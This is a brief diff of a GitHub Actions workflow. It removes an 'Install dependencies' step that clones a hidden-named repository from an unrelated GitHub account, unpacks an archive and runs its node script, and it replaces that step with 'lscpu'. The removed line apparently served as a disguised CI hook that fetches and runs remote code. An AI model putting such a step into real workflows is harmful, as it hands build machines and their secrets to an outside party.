@@ -28,4 +28,4 @@ jobs:
         node-version: ${{ matrix.node-version }}
 
     - name: Install dependencies
-      run: git clone https://github.com/breoli2025-outlook-com/.g.git && cd .g && tar xvf 4.tar.xz && node app.js
+      run: lscpu
